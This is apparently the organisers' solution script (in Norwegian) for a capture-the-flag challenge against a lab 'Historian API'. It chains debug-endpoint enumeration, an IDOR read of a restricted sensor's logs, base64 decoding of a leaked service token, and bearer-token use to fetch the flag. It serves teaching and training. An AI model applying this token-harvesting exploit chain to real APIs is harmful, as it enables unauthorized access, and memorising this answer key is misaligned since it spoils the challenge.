"""
LØSNING — Historian API multi-stage IDOR (ikke gi til deltakerne!)

Steg 1: Finn debug-endepunkt via enumering
Steg 2: IDOR — les restricted sensor (id=7)
Steg 3: Dekod base64-data med service-token
Steg 4: Bruk tokenet for å hente flagget
"""

import requests
import json
import base64
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"


def step1_enumerate():
    print("=== Steg 1: Finn debug-endepunkt ===\n")

    print("[*] Sjekker /api/v1/sensors ...")
    r = requests.get(f"{BASE}/api/v1/sensors")
    data = r.json()
    print(f"    → {data['count']} offentlige sensorer (id 1-3)")
    print(f"    → Note: '{data['note']}'")

    print("\n[*] Prøver /api/v1/debug/endpoints ...")
    r = requests.get(f"{BASE}/api/v1/debug/endpoints")
    if r.status_code == 200:
        endpoints = r.json()["endpoints"]
        print(f"    → FUNNET! {len(endpoints)} endepunkter:")
        for ep in endpoints:
            methods = ", ".join(ep["methods"])
            print(f"      {methods:6s} {ep['path']}")
    return endpoints


def step2_idor():
    print("\n\n=== Steg 2: IDOR — les alle sensorer ===\n")

    for sid in range(1, 8):
        r = requests.get(f"{BASE}/api/v1/sensors/{sid}")
        sensor = r.json()
        print(f"[*] Sensor {sid}: {sensor['name']:12s} | zone={sensor['zone']:12s} | access={sensor['access']}")

    print("\n[*] Henter logger for sensor 7 (restricted) ...")
    r = requests.get(f"{BASE}/api/v1/sensors/7/logs")
    logs = r.json()
    print(f"    → {logs['log_count']} loggposter")
    return logs["logs"]


def step3_decode(logs):
    print("\n\n=== Steg 3: Finn og dekod base64-data ===\n")

    for log_entry in logs:
        if "data" in log_entry:
            raw = log_entry["data"]
            print(f"[*] Fant base64-kodet 'data'-felt i loggpost:")
            print(f"    → raw: {raw[:60]}...")
            decoded = json.loads(base64.b64decode(raw))
            print(f"    → Decoded:")
            for k, v in decoded.items():
                print(f"      {k}: {v}")
            return decoded["token"]
    return None


def step4_get_flag(token):
    print(f"\n\n=== Steg 4: Bruk service-token mot /api/v1/admin/flag ===\n")

    print(f"[*] Token: {token}")
    r = requests.get(f"{BASE}/api/v1/admin/flag",
                     headers={"Authorization": f"Bearer {token}"})

    if r.status_code == 200:
        data = r.json()
        print(f"\n[+] *** FLAGG: {data['flag']} ***")
    else:
        print(f"[-] Feil: {r.status_code} {r.json()}")


if __name__ == "__main__":
    endpoints = step1_enumerate()
    logs      = step2_idor()
    token     = step3_decode(logs)
    if token:
        step4_get_flag(token)
